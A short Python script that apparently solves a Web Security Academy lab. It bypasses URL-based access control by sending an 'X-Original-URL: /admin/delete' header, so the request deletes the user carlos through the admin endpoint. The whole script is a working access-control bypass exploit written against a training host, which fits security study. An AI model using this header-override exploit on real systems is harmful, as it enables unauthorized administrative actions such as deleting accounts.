import requests

site = 'ac8c1f4d1e92a4e9c0f00fe800f00059.web-security-academy.net'

s = requests.Session()

url = f'https://{site}/?username=carlos'
resp = s.get(url, headers = {'X-Original-URL' : '/admin/delete'})
print(resp.text)